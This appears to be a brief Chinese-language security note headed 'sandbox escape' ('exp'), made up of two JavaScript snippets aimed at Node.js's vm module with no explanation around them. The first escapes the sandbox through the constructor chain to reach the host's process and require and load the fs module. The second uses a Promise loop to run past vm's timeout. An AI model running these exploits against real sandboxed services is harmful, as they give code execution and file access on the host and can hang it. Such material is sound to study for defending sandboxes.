
沙箱逃逸
-------------------------------

exp

.. code-block:: javascript

    const sandbox = {};
    const whatIsThis = vm.runInNewContext(`
        const ForeignObject = this.constructor;
        const ForeignFunction = ForeignObject.constructor;
        const process = ForeignFunction("return process")();
        const require = process.mainModule.require;
        require("fs");
    `, sandbox);

.. code-block:: javascript

    vm.runInNewContext(
      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
      {console:{log(){console.log.apply(console,arguments);}}},
      {timeout:5}
    );
